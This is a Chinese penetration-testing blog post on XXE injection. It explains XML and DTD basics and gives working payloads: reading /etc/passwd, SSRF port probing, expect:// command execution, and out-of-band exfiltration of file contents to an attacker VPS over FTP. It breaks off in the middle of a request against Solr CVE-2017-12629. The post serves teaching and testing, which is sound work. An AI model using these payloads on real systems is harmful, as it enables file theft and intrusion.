@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="XXE注入XML External Entity Iniection XML基础xml是一种可扩展标记语言1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE note [&amp;lt;!--定义此文档是note类型的文档--&amp;gt;&amp;lt;!ELEMENT note (to,from,heading,bo">
+<meta name="keywords" content="xxe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞">
+<meta property="og:url" content="https://choge.top/2020/07/27/XXE漏洞/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="XXE注入XML External Entity Iniection XML基础xml是一种可扩展标记语言1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE note [&amp;lt;!--定义此文档是note类型的文档--&amp;gt;&amp;lt;!ELEMENT note (to,from,heading,bo">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200728192442843.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200728194556055.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200728195425222.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200728231413726.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200729111625500.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200729113557700.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200729113507476.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200801131628456.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200802094903759.png">
+<meta property="og:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200802104353402.png">
+<meta property="og:updated_time" content="2020-08-04T02:25:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE漏洞">
+<meta name="twitter:description" content="XXE注入XML External Entity Iniection XML基础xml是一种可扩展标记语言1234567891011121314&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE note [&amp;lt;!--定义此文档是note类型的文档--&amp;gt;&amp;lt;!ELEMENT note (to,from,heading,bo">
+<meta name="twitter:image" content="https://choge.top/2020/07/27/XXE漏洞/image-20200728192442843.png">
+  <link rel="canonical" href="https://choge.top/2020/07/27/XXE漏洞/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>XXE漏洞 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/07/27/XXE漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            XXE漏洞
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-07-27 22:42:08" itemprop="dateCreated datePublished" datetime="2020-07-27T22:42:08+08:00">2020-07-27</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-04 10:25:37" itemprop="dateModified" datetime="2020-08-04T10:25:37+08:00">2020-08-04</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>7.8k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>7 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><p>XML External Entity Iniection </p><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h4><p>xml是一种可扩展标记语言</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为"#PCDATA"类型--&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from（#PCDATA)&gt;&lt;!--定义from元素为"#PCDATA"类型--&gt; </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<h4 id="XML文档与DTD文档"><a href="#XML文档与DTD文档" class="headerlink" title="XML文档与DTD文档"></a>XML文档与DTD文档</h4><p>DTD (Documnet Type Definition）即文档类型定义，是一种XML 约束模式语言，属于 XML 文件组成的一部分</p>
+<p>DTD 文档有三种应用形式 </p>
+<ol>
+<li>内部 DTD 文档</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为"#PCDATA"类型--&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from（#PCDATA)&gt;&lt;!--定义from元素为"#PCDATA"类型--&gt; </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>外部 DTD 文档</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素<span class="built_in"> SYSTEM </span><span class="string">"DTD文件路径"</span>&gt;    #函数SYSTEM的加载<span class="string">"DTD文件路径"</span>的内容赋值给根元素</span><br></pre></td></tr></table></figure>
+
+<p>新建一个DTD文档outdtd.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding"utf-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">poem</span>  (<span class="attr">author</span>,<span class="attr">title</span>,<span class="attr">content</span>)&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">author</span>  (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">title</span>  (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>新建一个xml文档outdtd.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE poem SYSTEM "dtd_2.dtd" [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT poem  (author,title,content)&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT content  (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">author</span>&gt;</span>wangwei<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">content</span>&gt;</span> this is content<span class="tag">&lt;/<span class="name">content</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>内外部 DTD 文档结合</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "DTD文件路径"[定义内容]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="dtd文档和xml文档实例的关系"><a href="#dtd文档和xml文档实例的关系" class="headerlink" title="dtd文档和xml文档实例的关系"></a>dtd文档和xml文档实例的关系</h4><p>数据库表结构与数据记录：</p>
+<p>由于 DTD，每个 XML 文件可以携带一个自身格式的描述</p>
+<p>由于 DTD，不同组织的人可以使用一个通用DTD来交换数据</p>
+<p>应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效。</p>
+<h4 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h4><p>XML分为普通实体和参数实体</p>
+<p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200728192442843.png" alt="image-20200728192442843"></p>
+<h5 id="普通实体引入外部实体"><a href="#普通实体引入外部实体" class="headerlink" title="普通实体引入外部实体"></a>普通实体引入外部实体</h5><p>新建xml文件，引入外部实体参数</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE poem [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></span><br><span class="line">&amp;xxe;</span><br><span class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="参数实体引入外部实体"><a href="#参数实体引入外部实体" class="headerlink" title="参数实体引入外部实体"></a>参数实体引入外部实体</h5><p>新建xml文件，引入外部参数实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=1.0 encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE % poem [</span></span><br><span class="line"><span class="meta">      &lt;!ENTITY % a SYSTEM "http://www.test.com/outdtd.dtd"&gt; </span></span><br><span class="line"><span class="meta">      % a;]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>outdtd.dtd</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT xxe<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h4><h5 id="任意外部实体引用，获取文件内容"><a href="#任意外部实体引用，获取文件内容" class="headerlink" title="任意外部实体引用，获取文件内容"></a>任意外部实体引用，获取文件内容</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY entity SYSTEM "flle://C:\Users\rugal\Desktop\test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;entity;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="URL请求"><a href="#URL请求" class="headerlink" title="URL请求"></a>URL请求</h5><p>SSRF请求192.168.2.1:6379，测试内外端口是否开放</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">     &lt;!ENTITY entity SYSTEM "http://192.168.2.1:6379"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;entity;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Dos拒绝服务"><a href="#Dos拒绝服务" class="headerlink" title="Dos拒绝服务"></a>Dos拒绝服务</h5><p><img src="//choge.top/2020/07/27/XXE漏洞/image-20200728194556055.png" alt="image-20200728194556055"></p>
+<h5 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h5><p>利用条件：在php开启expect扩展前提下</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;</span>  </span><br><span class="line"><span class="params">&lt;dir&gt;</span></span><br><span class="line"><span class="params">&lt;file&gt;</span><span class="variable">&amp;cmd</span>;<span class="params">&lt;/file&gt;</span> </span><br><span class="line"><span class="params">&lt;/dir&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="XXE漏洞发现"><a href="#XXE漏洞发现" class="headerlink" title="XXE漏洞发现"></a>XXE漏洞发现</h4><p>1.WebService服务</p>
+<p>2.判断request的xml请求是否被解析</p>
+<p> <img src="//choge.top/2020/07/27/XXE漏洞/image-20200728195425222.png" alt="image-20200728195425222"></p>
+<h4 id="JAVA-XXE"><a href="#JAVA-XXE" class="headerlink" title="JAVA XXE"></a>JAVA XXE</h4><h5 id="XXE直接回显"><a href="#XXE直接回显" class="headerlink" title="XXE直接回显"></a>XXE直接回显</h5><p>上图为直接回显</p>
+<h5 id="XXE间接回显"><a href="#XXE间接回显" class="headerlink" title="XXE间接回显"></a>XXE间接回显</h5><p>可以利用参数实体来获取回显数据</p>
+<p>思路：</p>
+<p>1 客户端发送 payload1 给 Web 服务器</p>
+<p>2 Web 服务器向 VPS 获取恶意的 DTD，并执行文件读取 payload2</p>
+<p>3 Web 服务器带着回显结果访问 VPS 上特定 FTP 或者 HTTP</p>
+<p>4 白帽子通过 VPS 获得回显</p>
+<p>客户端payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://vpsip/xml.dtd"&gt;%remote;]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>部分请求需要html实体编码如下，如为get请求一般为url编码</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="keyword">lt</span>;?<span class="keyword">xml</span> <span class="title">version</span>=&amp;quot;<span class="number">1.0</span>&amp;quot; <span class="attr">encoding=</span>&amp;quot;UTF-<span class="number">8</span>&amp;quot;?&amp;<span class="keyword">gt</span>;&amp;<span class="keyword">lt</span>;</span><br><span class="line">!DOCTYPE root [&amp;<span class="keyword">lt</span>;!ENTITY % remote SYSTEM %quot;http://vpsip/xml.dtd&amp;quot;&amp;<span class="keyword">gt</span>;%remote;]&amp;<span class="keyword">gt</span>;</span><br></pre></td></tr></table></figure>
+
+<p> vps payloads即<code>http://vpsip/xml.dtd</code>的内容如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY payload<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY % trick SYSTEM 'ftp://vps:21/%payload;'&gt;"</span>&gt; </span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+
+<p>vps基本使用html实体编码如下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY payload<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://vps:21/%payload;'&gt;"</span>&gt; </span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>1.禁用外部实体</p>
+<p>2.过滤和严重用户提交的xml数据</p>
+<p>3.不允许xml中含有任何自己声明的dtd</p>
+<h4 id="XXE实战"><a href="#XXE实战" class="headerlink" title="XXE实战"></a>XXE实战</h4><p>使用漏洞环境为</p>
+<p>Solr XXE漏洞（CVE-2017-12629）</p>
+<p>发送如下请求，访问ceye平台有回显，说明存在xxe</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span 